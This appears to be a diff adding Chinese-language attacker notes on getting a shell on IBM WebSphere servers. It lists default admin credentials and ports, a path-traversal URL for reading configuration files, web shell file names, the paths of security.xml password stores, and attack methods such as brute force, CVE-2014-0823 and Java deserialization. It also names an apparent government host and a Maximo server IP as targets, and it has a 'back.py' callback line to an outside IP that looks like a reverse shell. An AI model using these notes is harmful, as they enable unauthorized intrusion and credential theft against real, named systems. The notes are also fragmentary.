@@ -1,0 +1,119 @@
+Websphere 集成解决方案控制台
+
+WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。
+
+
+Websphere现在主流的版本是6-7-8，老版本的5.x部分老项目还在用。GetShell大致差不多。6、7测试都有“默认用户标识admin登录”，Websphere安装非常麻烦，所以没有像之前测试Resin、Tomcat那么细测。
+
+
+Websphere默认配置
+
+默认的管理后台地址（注意是HTTPS）： https://localhost:9043/ibm/console/logon.jsp
+#
+https://ggzy.dujiangyan.gov.cn:9043/ibm/console/login.do
+
+默认管理密码：
+
+1、admin (测试websphere6-7默认可以直接用admin作为用户标识登录，无需密码) 
+2、websphere/ websphere
+3、system/ manager
+   cietac
+
+默认端口：
+
+管理控制台端口 9060
+管理控制台安全端口 9043
+HTTP传输端口 9080
+HTTPS传输端口 9443
+引导程序端口 2809
+SIP端口 5060
+SIP安全端口 5061
+SOAP连接器端口 8880
+SAS SSL ServerAuth端口 9401
+CSIV2 ServerAuth 侦听器端口 9403
+CSIV2 MultiAuth 侦听器端口 9402
+ORB侦听器端口 9100
+高可用性管理通讯端口(DCS) 9353
+服务集成端口 7276
+服务集成安全端口 7286
+服务集成器MQ互操作性端口 5558
+服务集成器MQ互操作性安全端口 5578
+Websphere8.5登录页面： https://localhost:9043/ibm/console/logon.jsp
+
+Websphere6-7默认控制台地址也是： http://localhost:9043/ibm/console，此处用admin登录即可。
+
+注意：
+
+如果在Deploy低版本的Websphere的时候可能会提示web.xml错误，这里其实是因为支持的JavaEE版本限制，把war包里面的web.xml改成低版本就行了，如把app2.5改成2.3。
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+    <welcome-file-list>
+        <welcome-file>index.jsp</welcome-file>
+    </welcome-file-list>
+</web-app>
+
+
+
+#读取到配置文件
+
+code 区域
+
+http://**.**.**.**:8080/%c0%ae/WEB-INF/classes/applicationContext.xml
+
+
+
+#数据库信息
+JDBC 提供程序 > Oracle JDBC Driver > 数据源
+
+
+#环境》虚拟主机 查看端口
+
+
+/is_war.ear/is.war直接利用
+
+index.jspx  023
+cmd.jsp 
+index.jsp
+
+
+#密码 存储密码的 
+
+find /opt/IBM/WebSphere/AppServer/profiles -name security.xml
+
+/opt/IBM/WebSphere/AppServer/profiles/ctgDmgr01/config/cells/ctgCell01/security.xml
+/opt/IBM/WebSphere/AppServer/profiles/ctgAppSrv01/config/backup/base/cells/ctgNodeCell01/security.xml
+/opt/IBM/WebSphere/AppServer/profiles/ctgAppSrv01/config/cells/ctgCell01/security.xml 
+
+#查看端口
+
+/opt/IBM/WebSphere/AppServer/profiles/Dmgr01/config/cells/localhostCell01/nodes/localhostCellManager01/serverindex.xml
+/opt/IBM/WebSphere/AppServer/profiles/Dmgr01/config/cells/localhostCell01/nodes/localhostNode01/serverindex.xml
+
+
+
+
+#IBM Maximo   python /tmp/back.py 115.159.147.103 12888
+
+https://114.242.148.137:9443/maximo/webclient/login/login.jsp
+
+/opt/IBM/SMP/maximo/applications/maximo/maximouiweb/webmodule/webclient/login/images/mx_icon.png
+/opt/IBM/SMP/maximo/applications/maximo/maximouiweb/webmodule/webclient/login/images/mx_icon.png_orig
+/opt/IBM/WebSphere/AppServer/profiles/ctgAppSrv01/installedApps/ctgCell01/MAXIMO.ear/maximouiweb.war/webclient/login/images/mx_icon.png
+/opt/IBM/WebSphere/AppServer/profiles/ctgAppSrv01/installedApps/ctgCell01/MAXIMO.ear/maximouiweb.war/webclient/login/images/mx_icon.png_orig
+
+
+Websphere
+
+#默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090
+
+攻击方式：
+
+爆破：弱口令（控制台）
+
+任意文件泄漏：（CVE-2014-0823）
+
+Java反序列化
+
+ /opt/IBM/WebSphere/AppServer/profiles/Dmgr01/wstemp/92668751/workspace/cells/yxlx1Cell01/applications/Shell_war.ear/Shell_war.ear 中 
